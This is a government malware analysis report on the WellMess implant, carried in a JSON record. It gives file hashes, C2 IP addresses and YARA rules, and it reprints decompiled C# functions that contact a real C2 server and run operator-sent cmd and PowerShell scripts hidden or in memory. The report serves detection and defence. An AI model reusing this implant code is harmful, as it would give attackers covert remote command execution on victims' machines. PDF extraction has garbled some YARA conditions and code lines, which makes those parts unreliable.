{
    "id": "aaf0a8e3-9ac0-463d-a3f0-370c52e40296",
    "created_at": "2023-01-12T15:00:44.680576Z",
    "updated_at": "2025-03-27T02:15:55.280838Z",
    "deleted_at": null,
    "sha1_hash": "b3e746b238093cc5eda77905bea896d80691bf4d",
    "title": "2020-07-16 - Malware Analysis Report (AR20-198B)",
    "authors": "",
    "file_creation_date": "2022-05-29T01:05:00Z",
    "file_modification_date": "2022-05-29T01:05:00Z",
    "file_size": 952147,
    "plain_text": "# MAR-10296782-2.v1 – WELLMESS\n\n**us-cert.cisa.gov/ncas/analysis-reports/ar20-198b**\n\n## Notification\n\nThis report is provided \"as is\" for informational purposes only. The Department of Homeland Security (DHS) does not provide any warranties of\nany kind regarding any information contained herein. The DHS does not endorse any commercial product or service referenced in this bulletin\nor otherwise.\n\nThis document is marked TLP:WHITE--Disclosure is not limited. Sources may use TLP:WHITE when information carries minimal or no\nforeseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules,\nTLP:WHITE information may be distributed without restriction. For more information on the Traffic Light Protocol (TLP), see http://www.uscert.gov/tlp.\n\n## Summary\n\nDescription\n\nThe Malware Analysis Report (MAR) is the result of analytic efforts by the Cybersecurity and Infrastructure Security Agency (CISA). This\nmalware has been identified as WELLMESS. Advanced persistent threat (APT) groups have been identified using this malware. For more\ninformation regarding this malware, please visit: https://www.ncsc.gov.uk/news/advisory-apt29-targets-covid-19-vaccine-development\n\nThis report analyzes six unique files. The files are variants of the malware family known as \"WellMess\". These implants allow a remote\noperator to establish encrypted command and control (C2) sessions and to securely pass and execute scripts on an infected system.\n\nThe WellMess samples include one 32-bit Windows executable and five Executable and Linkable Format (ELF) files written in Go, an open\nsource programming language. The report includes analysis of a compiled .NET application extracted from one of the 32-bit Windows\nexecutables.\n\nThe ELF and 32-bit Windows executables have similar functionality; both collect the state of system privileges (disabled or enabled) from the\ninfected system and encrypt the data via a Rivest cipher 6 (RC6) algorithm, then dynamically generate Advanced Encryption Standard (AES)\nkeys, which are exchanged via a Rivest–Shamir–Adleman (RSA) secured key transfer scheme. Both versions also allow an operator to pass\nAES encrypted executable scripts to infected systems.\n[For a downloadable copy of IOCs, see MAR-10296782-2.v1.stix.](https://us-cert.cisa.gov/sites/default/files/publications/MAR-10296782-2.v1.stix.xml)\n\nSubmitted Files (6)\n\n14e9b5e214572cb13ff87727d680633f5ee238259043357c94302654c546cad2 (14e9b5e214572cb13ff87727d68063...)\n\n5ca4a9f6553fea64ad2c724bf71d0fac2b372f9e7ce2200814c98aac647172fb (5ca4a9f6553fea64ad2c724bf71d0f...)\n\n7c39841ba409bce4c2c35437ecf043f22910984325c70b9530edf15d826147ee (7c39841ba409bce4c2c35437ecf043...)\n\n953b5fc9977e2d50f3f72c6ce85e89428937117830c0ed67d468e2d93aa7ec9a (953b5fc9977e2d50f3f72c6ce85e89...)\n\ne329607379a01483fc914a47c0062d5a3a8d8d65f777fbad2c5a841a90a0af09 (e329607379a01483fc914a47c0062d...)\n\nfd3969d32398bbe3709e9da5f8326935dde664bbc36753bd41a0b111712c0950 (fd3969d32398bbe3709e9da5f83269...)\n\nAdditional Files (1)\n\n47cdb87c27c4e30ea3e2de620bed380d5aed591bc50c49b55fd43e106f294854 (WellMess.net.extract.bin)\n\nIPs (5)\n\n103.73.188.101\n\n141.98.212.55\n\n192.48.88.107\n\n209.58.186.196\n\n85.93.2.116\n\n## Findings\n\n**953b5fc9977e2d50f3f72c6ce85e89428937117830c0ed67d468e2d93aa7ec9a**\n\nTags\n\ntrojan\n\n\n-----\n\n**Name** 953b5fc9977e2d50f3f72c6ce85e89428937117830c0ed67d468e2d93aa7ec9a\n\n**Size** 172032 bytes\n\n**Type** PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows\n\n**MD5** f18ced8772e9d1a640b8b4a731dfb6e0\n\n**SHA1** 92f7b470c5a2c95a4df04c2c5cd50780f6dbdda1\n\n**SHA256** 953b5fc9977e2d50f3f72c6ce85e89428937117830c0ed67d468e2d93aa7ec9a\n\n**SHA512** c4ac5332ee27b3da002c8a55a1e99aefeb503a69b8eb1ce9310bcb12131d56d2efe70f50942461ec9e7c628e3d1a5f13c92faa6bb6b1c2\n\n**ssdeep** 1536:Lo7PHWHfGE50u3J0cMuNJdbOYOL68q4ATMMx4pnMgqZ5C/yOCy2UpiPKsNoeIlnt:E7PHwJdbJOOvkuC/yOH2CiP0ie1XF\n\n**Entropy** 3.887546\n\nAntivirus\n\n**BitDefender** Gen:Variant.Razy.279280\n\n**ClamAV** Win.Trojan.WellMess-6706033-0\n\n**Emsisoft** Gen:Variant.Razy.279280 (B)\n\n**McAfee** GenericRXEI-SR!F18CED8772E9\n\n**NANOAV** Trojan.Win32.WellMess.fignvr\n\n**Quick Heal** Trojan.Wellmess\n\nYARA Rules\n\n\n-----\n\nu e C S _ 0 96 8 _0 t oja SS\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nDate= \"2020-07-06\"\nLast_Modified=\"20200706_1017\"\nActor=\"n/a\"\nCategory=\"Trojan\"\nFamily=\"WellMess\"\nDescription = \"Detects WellMess implant and SangFor Exploit\"\nMD5_1 = \"4d38ac3319b167f6c8acb16b70297111\"\nSHA256_1 = \"7c39841ba409bce4c2c35437ecf043f22910984325c70b9530edf15d826147ee\"\nMD5_2 = \"a32e1202257a2945bf0f878c58490af8\"\nSHA256_2 = \"a4b790ddffb3d2e6691dcacae08fb0bfa1ae56b6c73d70688b097ffa831af064\"\nMD5_3 = \"861879f402fe3080ab058c0c88536be4\"\nSHA256_3 = \"14e9b5e214572cb13ff87727d680633f5ee238259043357c94302654c546cad2\"\nMD5_4 = \"2f9f4f2a9d438cdc944f79bdf44a18f8\"\nSHA256_4 = \"e329607379a01483fc914a47c0062d5a3a8d8d65f777fbad2c5a841a90a0af09\"\nMD5_5 = \"ae7a46529a0f74fb83beeb1ab2c68c5c\"\nSHA256_5 = \"fd3969d32398bbe3709e9da5f8326935dde664bbc36753bd41a0b111712c0950\"\nMD5_6 = \"f18ced8772e9d1a640b8b4a731dfb6e0\"\nSHA256_6 = \"953b5fc9977e2d50f3f72c6ce85e89428937117830c0ed67d468e2d93aa7ec9a\"\nMD5_7 = \"3a9cdd8a5cbc3ab10ad64c4bb641b41f\"\nSHA256_7 = \"5ca4a9f6553fea64ad2c724bf71d0fac2b372f9e7ce2200814c98aac647172fb\"\nMD5_8 = \"967fcf185634def5177f74b0f703bdc0\"\nSHA256_8 = \"58d8e65976b53b77645c248bfa18c3b87a6ecfb02f306fe6ba4944db96a5ede2\"\nMD5_9 = \"c5d5cb99291fa4b2a68b5ea3ff9d9f9a\"\nSHA256_9 = \"65495d173e305625696051944a36a031ea94bb3a4f13034d8be740982bc4ab75\"\nMD5_10 = \"01d322dcac438d2bb6bce2bae8d613cb\"\nSHA256_10 = \"0c5ad1e8fe43583e279201cdb1046aea742bae59685e6da24e963a41df987494\"\nMD5_11 = \"8777a9796565effa01b03cf1cea9d24d\"\nSHA256_11 = \"83014ab5b3f63b0253cdab6d715f5988ac9014570fa4ab2b267c7cf9ba237d18\"\nMD5_12 = \"507bb551bd7073f846760d8b357b7aa9\"\nSHA256_12 = \"47cdb87c27c4e30ea3e2de620bed380d5aed591bc50c49b55fd43e106f294854\"\nstrings:\n$0 = \"/home/ubuntu/GoProject/src/bot/botlib/chat.go\"\n$1 = \"/home/ubuntu/GoProject/src/bot/botlib.Post\"\n$2 = \"GoProject/src/bot/botlib.deleteFile\"\n$3 = \"ubuntu/GoProject/src/bot/botlib.generateRandomString\"\n$4 = \"GoProject/src/bot/botlib.AES_Decrypt\"\n$5 = { 53 00 63 00 72 00 69 00 70 00 74 00 00 0F 63 00 6D 00 64 00 2E 00 65 00 78 00 65 00 00 07 2F 00 63 }\n$6 = { 3C 00 6E 00 77 00 3E 00 2E 00 2A 00 29 00 00 0B 24 00 7B 00 66 00 6E 00 7D }\n$7 = { 7B 00 61 00 72 00 67 00 7D 00 00 0B 24 00 7B 00 6E 00 77 00 7D }\n$8 = { 52 61 6E 64 6F 6D 53 74 72 69 6E 67 00 44 65 6C 65 74 65 46 69 6C 65 }\n$9 = \"get_keyRC6\"\n$10 = { 7D A3 26 77 1D 63 3D 5A 32 B4 6F 1F 55 49 44 25 }\n$11 = { 47 C2 2F 35 93 41 2F 55 73 0B C2 60 AB E1 2B 42 }\n$12 = { 53 58 9B 17 1F 45 BD 72 EC 01 30 6C 4F CA 93 1D }\n$13 = { 48 81 21 81 5F 53 3A 64 E0 ED FF 21 23 E5 00 12 }\n$14 = \"GoProject/src/bot/botlib.wellMess\"\n$15 = { 62 6F 74 6C 69 62 2E 4A 6F 69 6E 44 6E 73 43 68 75 6E 6B 73 }\n$16 = { 62 6F 74 6C 69 62 2E 45 78 65 63 }\n$17 = { 62 6F 74 6C 69 62 2E 47 65 74 52 61 6E 64 6F 6D 42 79 74 65 73 }\n$18 = { 62 6F 74 6C 69 62 2E 4B 65 79 }\n$19 = { 7F 16 21 9D 7B 03 CB D9 17 3B 9F 27 B3 DC 88 0F }\n$20 = { D9 BD 0A 0E 90 10 B1 39 D0 C8 56 58 69 74 15 8B }\n$21 = { 44 00 59 00 4A 00 20 00 36 00 47 00 73 00 62 00 59 00 31 00 2E }\n$22 = { 6E 00 20 00 46 00 75 00 7A 00 2C 00 4B 00 5A 00 20 00 33 00 31 00 69 00 6A 00 75 }\n$23 = { 43 00 31 00 69 00 76 00 66 00 39 00 32 00 20 00 56 00 37 00 6C 00 4F 00 48 }\n$24 = { 66 69 6C 65 4E 61 6D 65 3A 28 3F 50 3C 66 6E 3E 2E 2A 3F 29 5C 73 61 72 67 73 3A 28 3F 50 3C 61 72 67 3E 2E 2A 3F }\n$25 = { 5C 00 2E 00 53 00 61 00 6E 00 67 00 66 00 6F 00 72 00 55 00 44 00 2E 00 73 00 75 00 6D }\n$26 = { 66 6F 72 6D 2D 64 61 74 61 3B 20 6E 61 6D 65 3D 22 5F 67 61 22 3B 20 66 69 6C 65 6E 61 6D 65 3D }\n$27 = { 40 5B 5E 5C 73 5D 2B 3F 5C 73 28 3F 50 3C 74 61 72 3E 2E 2A 3F 29 5C 73 27 }\ncondition:\n\n\n-----\n\n($0 a d $ a d $ a d $3 a d $ ) o ($5 a d $6 a d $ a d $8 a d $9) o ($ 0 a d $ ) o ($ a d $ 3) o ($ ) o ($ 5 a d $ 6\nand $17 and $18) or ($19 and $20) or ($21 and $22 and $23) or ($24) or ($25 and $26) or ($27)\n}\n\nssdeep Matches\n\nNo matches found.\n\nPE Metadata\n\n**Compile Date** 2018-03-28 07:14:10-04:00\n\n**Import Hash** f34d5f2d4577ed6d9ceec516c1f5a744\n\n**Company Name** Microsoft Corporation\n\n**File Description** Power Settings Command-Line Tool\n\n**Internal Name** powercfg.exe\n\n**Legal Copyright** © Microsoft Corporation. All rights reserved.\n\n**Original Filename** powercfg.exe\n\n**Product Name** Microsoft® Windows® Operating System\n\n**Product Version** 6.1.7600.16385 (win7_rtm.090713-1255)\n\nPE Sections\n\n**MD5** **Name** **Raw Size** **Entropy**\n\nb90f84adffd98c3c63291dc54f766f18 header 4096 0.462120\n\n25e1daba00e54a31c1d9bb459988f669 .text 159744 4.056043\n\nbb5030c93de573a2819699404e0436be .rsrc 4096 2.256683\n\nf662c2f95c916d5bd4f0c939236a81e9 .reloc 4096 0.016408\n\nPackers/Compilers/Cryptors\n\nMicrosoft Visual C# v7.0 / Basic .NET\n\nRelationships\n\n953b5fc997... Created 47cdb87c27c4e30ea3e2de620bed380d5aed591bc50c49b55fd43e106f294854\n\nDescription\n\nThis file is a malicious compiled .NET application. It decrypts and loads an embedded dynamic link library (DLL) \"WellMess.net.extract.bin\"\n(47cdb87c27c4e30ea3e2de620bed380d5aed591bc50c49b55fd43e106f294854).\n\nScreenshots\n\n\n-----\n\n**Figure 1 - Screenshot of the code structure which decrypts the embedded DLL.**\n\n**47cdb87c27c4e30ea3e2de620bed380d5aed591bc50c49b55fd43e106f294854**\n\nTags\n\ntrojan\n\nDetails\n\n**Name** WellMess.net.extract.bin\n\n**Size** 45056 bytes\n\n**Type** PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows\n\n**MD5** 507bb551bd7073f846760d8b357b7aa9\n\n**SHA1** 23033dcad2d60574ea8a65862431f46b950e54c3\n\n**SHA256** 47cdb87c27c4e30ea3e2de620bed380d5aed591bc50c49b55fd43e106f294854\n\n**SHA512** fbad8f6e4c2a49ad7e030bfc069b830027942383a5429ac129ba4880c7f90d9e1ec84186755cbb61c39b41096d7969fa5e1e7a13918d16\n\n**ssdeep** 768:vLTf79aYYuGhmohyWdDZo/G9sklJL+9Ok/JSbrvfMAQ:/fMtYG9PB+9OyYXHhQ\n\n**Entropy** 4.625315\n\nAntivirus\n\nNo matches found.\n\nYARA Rules\n\n\n-----\n\nu e C S _ 0 96 8 _0 t oja SS\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nDate= \"2020-07-06\"\nLast_Modified=\"20200706_1017\"\nActor=\"n/a\"\nCategory=\"Trojan\"\nFamily=\"WellMess\"\nDescription = \"Detects WellMess implant and SangFor Exploit\"\nMD5_1 = \"4d38ac3319b167f6c8acb16b70297111\"\nSHA256_1 = \"7c39841ba409bce4c2c35437ecf043f22910984325c70b9530edf15d826147ee\"\nMD5_2 = \"a32e1202257a2945bf0f878c58490af8\"\nSHA256_2 = \"a4b790ddffb3d2e6691dcacae08fb0bfa1ae56b6c73d70688b097ffa831af064\"\nMD5_3 = \"861879f402fe3080ab058c0c88536be4\"\nSHA256_3 = \"14e9b5e214572cb13ff87727d680633f5ee238259043357c94302654c546cad2\"\nMD5_4 = \"2f9f4f2a9d438cdc944f79bdf44a18f8\"\nSHA256_4 = \"e329607379a01483fc914a47c0062d5a3a8d8d65f777fbad2c5a841a90a0af09\"\nMD5_5 = \"ae7a46529a0f74fb83beeb1ab2c68c5c\"\nSHA256_5 = \"fd3969d32398bbe3709e9da5f8326935dde664bbc36753bd41a0b111712c0950\"\nMD5_6 = \"f18ced8772e9d1a640b8b4a731dfb6e0\"\nSHA256_6 = \"953b5fc9977e2d50f3f72c6ce85e89428937117830c0ed67d468e2d93aa7ec9a\"\nMD5_7 = \"3a9cdd8a5cbc3ab10ad64c4bb641b41f\"\nSHA256_7 = \"5ca4a9f6553fea64ad2c724bf71d0fac2b372f9e7ce2200814c98aac647172fb\"\nMD5_8 = \"967fcf185634def5177f74b0f703bdc0\"\nSHA256_8 = \"58d8e65976b53b77645c248bfa18c3b87a6ecfb02f306fe6ba4944db96a5ede2\"\nMD5_9 = \"c5d5cb99291fa4b2a68b5ea3ff9d9f9a\"\nSHA256_9 = \"65495d173e305625696051944a36a031ea94bb3a4f13034d8be740982bc4ab75\"\nMD5_10 = \"01d322dcac438d2bb6bce2bae8d613cb\"\nSHA256_10 = \"0c5ad1e8fe43583e279201cdb1046aea742bae59685e6da24e963a41df987494\"\nMD5_11 = \"8777a9796565effa01b03cf1cea9d24d\"\nSHA256_11 = \"83014ab5b3f63b0253cdab6d715f5988ac9014570fa4ab2b267c7cf9ba237d18\"\nMD5_12 = \"507bb551bd7073f846760d8b357b7aa9\"\nSHA256_12 = \"47cdb87c27c4e30ea3e2de620bed380d5aed591bc50c49b55fd43e106f294854\"\nstrings:\n$0 = \"/home/ubuntu/GoProject/src/bot/botlib/chat.go\"\n$1 = \"/home/ubuntu/GoProject/src/bot/botlib.Post\"\n$2 = \"GoProject/src/bot/botlib.deleteFile\"\n$3 = \"ubuntu/GoProject/src/bot/botlib.generateRandomString\"\n$4 = \"GoProject/src/bot/botlib.AES_Decrypt\"\n$5 = { 53 00 63 00 72 00 69 00 70 00 74 00 00 0F 63 00 6D 00 64 00 2E 00 65 00 78 00 65 00 00 07 2F 00 63 }\n$6 = { 3C 00 6E 00 77 00 3E 00 2E 00 2A 00 29 00 00 0B 24 00 7B 00 66 00 6E 00 7D }\n$7 = { 7B 00 61 00 72 00 67 00 7D 00 00 0B 24 00 7B 00 6E 00 77 00 7D }\n$8 = { 52 61 6E 64 6F 6D 53 74 72 69 6E 67 00 44 65 6C 65 74 65 46 69 6C 65 }\n$9 = \"get_keyRC6\"\n$10 = { 7D A3 26 77 1D 63 3D 5A 32 B4 6F 1F 55 49 44 25 }\n$11 = { 47 C2 2F 35 93 41 2F 55 73 0B C2 60 AB E1 2B 42 }\n$12 = { 53 58 9B 17 1F 45 BD 72 EC 01 30 6C 4F CA 93 1D }\n$13 = { 48 81 21 81 5F 53 3A 64 E0 ED FF 21 23 E5 00 12 }\n$14 = \"GoProject/src/bot/botlib.wellMess\"\n$15 = { 62 6F 74 6C 69 62 2E 4A 6F 69 6E 44 6E 73 43 68 75 6E 6B 73 }\n$16 = { 62 6F 74 6C 69 62 2E 45 78 65 63 }\n$17 = { 62 6F 74 6C 69 62 2E 47 65 74 52 61 6E 64 6F 6D 42 79 74 65 73 }\n$18 = { 62 6F 74 6C 69 62 2E 4B 65 79 }\n$19 = { 7F 16 21 9D 7B 03 CB D9 17 3B 9F 27 B3 DC 88 0F }\n$20 = { D9 BD 0A 0E 90 10 B1 39 D0 C8 56 58 69 74 15 8B }\n$21 = { 44 00 59 00 4A 00 20 00 36 00 47 00 73 00 62 00 59 00 31 00 2E }\n$22 = { 6E 00 20 00 46 00 75 00 7A 00 2C 00 4B 00 5A 00 20 00 33 00 31 00 69 00 6A 00 75 }\n$23 = { 43 00 31 00 69 00 76 00 66 00 39 00 32 00 20 00 56 00 37 00 6C 00 4F 00 48 }\n$24 = { 66 69 6C 65 4E 61 6D 65 3A 28 3F 50 3C 66 6E 3E 2E 2A 3F 29 5C 73 61 72 67 73 3A 28 3F 50 3C 61 72 67 3E 2E 2A 3F }\n$25 = { 5C 00 2E 00 53 00 61 00 6E 00 67 00 66 00 6F 00 72 00 55 00 44 00 2E 00 73 00 75 00 6D }\n$26 = { 66 6F 72 6D 2D 64 61 74 61 3B 20 6E 61 6D 65 3D 22 5F 67 61 22 3B 20 66 69 6C 65 6E 61 6D 65 3D }\n$27 = { 40 5B 5E 5C 73 5D 2B 3F 5C 73 28 3F 50 3C 74 61 72 3E 2E 2A 3F 29 5C 73 27 }\ncondition:\n\n\n-----\n\n($0 a d $ a d $ a d $3 a d $ ) o ($5 a d $6 a d $ a d $8 a d $9) o ($ 0 a d $ ) o ($ a d $ 3) o ($ ) o ($ 5 a d $ 6\nand $17 and $18) or ($19 and $20) or ($21 and $22 and $23) or ($24) or ($25 and $26) or ($27)\n}\n\nssdeep Matches\n\nNo matches found.\n\nPE Metadata\n\n**Compile Date** 2018-03-27 09:22:21-04:00\n\n**Import Hash** dae02f32a21e03ce65412f6e56942daa\n\n**Company Name** Microsoft Corporation\n\n**File Description**\n\n**Internal Name** x643.Microsoft.Dtc.PowerShell.dll\n\n**Legal Copyright** Copyright (c) Microsoft Corporation. All rights reserved.\n\n**Original Filename** x643.Microsoft.Dtc.PowerShell.dll\n\n**Product Name** Microsoft (R) Windows (R) Operating System\n\n**Product Version** 10.0.14393.0\n\nPE Sections\n\n**MD5** **Name** **Raw Size** **Entropy**\n\n668481e5e1971f610581ea0b01b617b5 header 4096 0.434226\n\nced7014e20c39fba49386f6aef5e1203 .text 32768 5.701312\n\n1d4922f19bd3e79cfdf93cd91be7af27 .rsrc 4096 1.150437\n\nda55cd9f0f50ad5c82000ca03bfaa4be .reloc 4096 0.013127\n\nPackers/Compilers/Cryptors\n\nMicrosoft Visual C# v7.0 / Basic .NET\n\nRelationships\n\n47cdb87c27... Connected_To 85.93.2.116\n\n47cdb87c27... Created_By 953b5fc9977e2d50f3f72c6ce85e89428937117830c0ed67d468e2d93aa7ec9a\n\nDescription\n\nThis file is a compiled .NET application. It has been identified as a variant of the WellMess malware family. Displayed below is a function\nnamed “HXYGVr()” which was extracted from this application:\n\n—Begin Extracted Function—\npublic void HXYGVr()\n{\nVariable.url = \"hxxp[:]//85.93.2.116\";\nstring Address = \"\";\nVariable.proxy = !string.IsNullOrEmpty(Address) ? new WebProxy(Address) : (WebProxy) null;\nVariable.serverType = \"GO\";\nVariable.userAgent = \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/21.0\";\nVariable.maxPostSize = 5000000;\nVariable.keyRC6 = \"UJqqarUGKm1kR1mQMf5K2g==\";\nKey publicKey;\npublicKey.keySize = 2048;\npublicKey.publicKey = \"<RSAKeyValue>\n<Modulus>4Dy24gTFNYA/jq6SYiAkdRvY1ieWqM9R8dwo0uL+4GzaRObZEoUaZSHhvfeD1v762+duL1LgAcuXJeRg4PB4cGdpZqjKtB2BKIDJv3h2\n</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>\";\nVariable.interval = 12.0;\nif (!this.IsInit)\n\n{\n\n\n-----\n\nt t e t(pub c ey);\nthis.Hash = Variable.hash;\nthis.Skey = Variable.keySymm;\nthis.IsInit = true;\nthis.Ua = Variable.userAgent;\nthis.MaxPostSize = Variable.maxPostSize;\nthis.HealthInterval = Variable.interval;\n}\nelse\n{\nVariable.hash = this.Hash;\nVariable.keySymm = this.Skey;\nVariable.userAgent = this.Ua;\nVariable.maxPostSize = this.MaxPostSize;\nVariable.interval = this.HealthInterval;\nDictionary<string, string> segmentsMessage = Chat.Download(Variable.hash, \"rc\", string.Empty);\nif (segmentsMessage[\"head\"] == \"G\")\n{\nthis.Complete = true;\nif (!this.Hx)\nreturn;\nChat.Send(Encoding.UTF8.GetBytes(\"Missed me?\"), Variable.keySymm, Variable.hash + \"/h\", \"a\", \"h\", Variable.maxPostSize);\n}\nelse if (segmentsMessage[\"head\"] == \"C\")\n{\nnew Chunks().Join((object) new ChatParameters()\n{\nsegmentsMessage = segmentsMessage\n});\nthis.Complete = false;\nThread.Sleep(20000);\n}\nelse if (segmentsMessage[\"service\"] == \"p\")\n{\nInit init = new Init(publicKey);\nthis.Hash = Variable.hash;\nthis.Skey = Variable.keySymm;\nthis.Complete = false;\n}\nelse\n{\nnew Choise().Work(segmentsMessage);\nthis.Complete = false;\nthis.Ua = Variable.userAgent;\nthis.MaxPostSize = Variable.maxPostSize;\nthis.HealthInterval = Variable.interval;\n}\n}\n—End Extracted Function—\n\nThis function appears to be the main export of the DLL, which initiates a C2 session with the implants remote C2 server at the Internet Protocol\n(IP) address, 85.93.2.116. Contained within the function is a public RSA key utilized by the malware to secure communication with its C2\nserver. The function also contains an RC6 cryptographic key, which is utilized to secure state information within the C2 sessions, such as a\nunique hash value which is generated to identify the unique target system.\n\nThe malware accepts and executes PowerShell and batch scripts from a remote operator on the infected system. These executable scripts will\nbe provided within a C2 session that is secured with AES encryption. In addition, the AES key transfer process between the implant and the\nremote operator will be encrypted utilizing RSA asymmetric cryptography making the detection of malicious executable code traveling over the\nnetwork difficult to detect. The function which provides the script execution capability is illustrated below. Note: the execution of a script using\nthis method will result in a separate malicious process:\n\n—Begin Command Function—\npublic void Command(object message)\n{\n\nChatParameters chatParameters = (ChatParameters) message;\n\n\n-----\n\nt y\n{\nstring s = string.Empty;\nMatch match = new Regex(\"fileName:(?<fn>.*?)\\\\sargs:(?<arg>.*)\\\\snotwait:(?<nw>.*)\", RegexOptions.IgnoreCase |\nRegexOptions.Multiline | RegexOptions.Singleline).Match(chatParameters.segmentsMessage[\"body\"]);\nstring str1 = match.Result(\"${fn}\").ToString();\nstring script = match.Result(\"${arg}\").ToString();\nstring str2 = match.Result(\"${nw}\").ToString();\nProcess process = new Process();\nProcessStartInfo processStartInfo = new ProcessStartInfo();\nprocessStartInfo.CreateNoWindow = true;\nprocessStartInfo.WindowStyle = ProcessWindowStyle.Hidden;\nprocessStartInfo.UseShellExecute = false;\nprocessStartInfo.RedirectStandardOutput = true;\nprocessStartInfo.FileName = str1;\nif (str1 == \"powershellScript\")\n{\ns = BotChat.Pshell(script);\n}\nelse\n{\nif (!string.IsNullOrEmpty(script))\nprocessStartInfo.Arguments = !(str1 == \"cmd.exe\") ? script : \"/c \" + script;\nprocess.StartInfo = processStartInfo;\nprocess.Start();\nif (string.IsNullOrEmpty(str2))\n{\ns = process.StandardOutput.ReadToEnd();\nprocess.WaitForExit();\n}\n}\nprocess.Close();\nthis.Reply(Encoding.UTF8.GetBytes(s), chatParameters.segmentsMessage[\"head\"], chatParameters.segmentsMessage[\"service\"]);\n}\ncatch (Exception ex)\n{\nthis.Reply(Encoding.UTF8.GetBytes(ex.Message.ToString()), chatParameters.segmentsMessage[\"head\"],\nchatParameters.segmentsMessage[\"service\"]);\nThread.Sleep(1000);\n}\n}\n—End Command Function—\n\nThe implant can also run PowerScripts scripts directly from memory. The malware contains the following function providing this capability.\nNote: executing a PowerShell script using this method will not result in a separate malicious process.\n\n—Begin PowerShell Function—\n\nprivate static string Pshell(string script)\n{\nstring empty = string.Empty;\nCollection<PSObject> collection;\nusing (Runspace runspace = RunspaceFactory.CreateRunspace())\n{\ntry\n{\nrunspace.Open();\nusing (PowerShell powerShell = PowerShell.Create())\n{\npowerShell.Runspace = runspace;\nScriptBlock scriptBlock = ScriptBlock.Create(script);\npowerShell.AddCommand(\"Invoke-Command\").AddParameter(\"ScriptBlock\", (object) scriptBlock);\ncollection = powerShell.Invoke();\n}\n\n}\n\n\n-----\n\na y\n{\nrunspace.Close();\n}\n}\nforeach (PSObject psObject in collection)\nempty += psObject.ToString();\nreturn empty;\n}\n—End PowerShell Function—\n\nDisplayed below is sample communication traffic between this WellMess implant and its C2 server.\n\n—Begin Sample Network Traffic—\nPOST / HTTP/1.1\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/21.0\nContent-Type: application/x-www-form-urlencoded\nAccept: text/html, */*\nAccept-Language: en-US,en;q=0.8\nCookie:\n4NJZrNBl=80WOGU+5py+Cq0GVi+JMiq6ka+x%3aGeT+%3a7jpfqo+q1%3aa+6j9Delt+yDQ+SpTmS5+T5TpR.+DwUNdr+gjsJf+svT+Byw+sysM.+A\nHost: 85.93.2.116\nContent-Length: 798\nExpect: 100-continue\nAccept-Encoding: deflate\nConnection: Keep-Alive\n\nPXYaTG AoW 0gVV4R xKRORQU em5Jz OqxrlVM PweS oOVI30A 1oZ OgLqNp JyA1q. Dos2gp N0c3C q:d tKX IdNx. zkTbV QmOjB\nHXU::fP eUN4 jBOI. RlCFb xOTaSL C0k:BKg EGVy fsoDDZ. arfb,2fvY xYlkGpW,D6 ikXZ6. kJT 6N82Au,2Uf t7mOYW9 DLyAy. CF60ZX\nTIswg X7XBA: E6Xj2a unGhGIR. fir 1rH1jkG QPEc t1I53 iED. aomEaY n84rKx ECxZ0K yeDLh4 suZyqzp. ITxjQq b58:jvm lsOT AC,o mlM1.\nV3oUd U6bU:y8 WzJ8t pWUN76I KxnVY3. uUTz,K jDK qba yqU 1AvBN. pVg 3Duu 34IA g9jZc pr77J. 0h8lQGU lm3ReWd F2SB 7Yes fk1J.\nndl8o tpzJ NhXH bjNO 8nm:Aqm. l0HHBo dOypefA hja IAQ,NUHFF7. yt, F:Gp OU1 S3e4GZ NU7HvZW. hAINPwR kDCE2Ev cQiiXU TXY\nKpt. prnvUns el4sMa 9do tw: eisS58C. d2wKh :T0F kxk mZTI jU1. 4y:Y6l YQgZ6t 0uANCK2 UpHCRc2 cbgnSm. UFu k:cIT cBH5 Fxk 2Jk.\nErKKHod 0dgeQ5e 7MV 8PH0 tsUn. dMd,glf x3Q ZpNEDt FnvMxh IM:p:. lbabsz3EA\n—End Sample Network Traffic—\n\nContained within the “Cookie:” section of the data is simple session information, including a hash that is unique to the target system. The\nunique hash generated from the target system is computed by calculating the SHA256 hash of various pieces of information about the victim\nsystem pieced together into a single string (Figure 2). These pieces of information include the computer name, session name, computer name,\nand user domain.\n\nThis data is RC6 encrypted with a hard-coded key and then Base64 encoded. This Base64 encoding is then encoded with the following\nalgorithm which generates slightly modified Base64 data that appears to contain spaces between different parts of the original Base64\nencoded data:\n\n—Begin FromBase64ToNormal Function—\npublic static string FromBase64ToNormal(string base64Str)\n{\nint num1 = 0;\nint length1 = base64Str.Length;\nstring str1 = base64Str.Replace(\"=\", \" \");\nbase64Str = string.Empty;\nstring str2 = str1.Replace('+', ',');\nstring empty1 = string.Empty;\nstring str3 = str2.Replace('/', ':');\nstring empty2 = string.Empty;\nStringBuilder stringBuilder = new StringBuilder();\nint length2 = str3.TrimEnd().Length;\nRandom random = new Random();\nint startIndex = 0;\nwhile (startIndex < length2 - 9)\n{\nint length3 = random.Next(3, 8);\nint num2 = startIndex + length3;\nif (num1 > 5 && num1 % 5 == 0)\n\nt i B ild A d( t 3 S b t i ( t tI d l th3) \" \")\n\n\n-----\n\ne se\nstringBuilder.Append(str3.Substring(startIndex, length3) + \" \");\nstartIndex = num2;\n++num1;\n}\nstringBuilder.Append(str3.Substring(startIndex));\nstring empty3 = string.Empty;\nreturn stringBuilder.ToString();\n}\n—End FromBase64ToNormal Function—\n\nThe newly encoded string is then broken into two separate parts. The split in the string happens at a random offset (Figure 3). The two new\nparts of the string are then prepended with random strings followed by an “=“ character. Both of the strings are then Uniform Resource Locator\n(URL) encoded.\n\nUpon execution, the malware generates an AES key which will be used during C2 sessions. This key is generated via the following function:\n\n—Begin AES Key Generation Function—\npublic static Dictionary<string, byte[]> GenerateSymmKey()\n{\nDictionary<string, byte[]> dictionary = new Dictionary<string, byte[]>();\nbyte[] hash = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(Membership.GeneratePassword(16, 4)));\nbyte[] randomBytes = GenerateKeys.GetRandomBytes(8);\nusing (RijndaelManaged rijndaelManaged = new RijndaelManaged())\n{\nrijndaelManaged.KeySize = 256;\nrijndaelManaged.BlockSize = 